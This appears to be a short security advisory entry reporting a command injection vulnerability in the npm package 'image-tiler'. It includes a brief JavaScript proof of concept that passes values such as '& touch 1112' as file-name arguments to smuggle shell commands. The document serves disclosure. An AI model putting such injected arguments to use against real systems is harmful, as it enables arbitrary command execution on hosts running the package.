  title: Command Injection
  description: |
    [image-tiler][1] is a package that creates zoom tile pyramids from a
    large image. There are other packages very similar to this one, but none
    did exactly what I needed, so I made mine.

    Affected versions of this package are vulnerable to Command Injection.

    ### PoC   {#poc}

        var tile = require("image-tiler").tile;
        var tilePromise = tile("& touch 1112","& touch 222","& touch 33",{invertZoom:true});
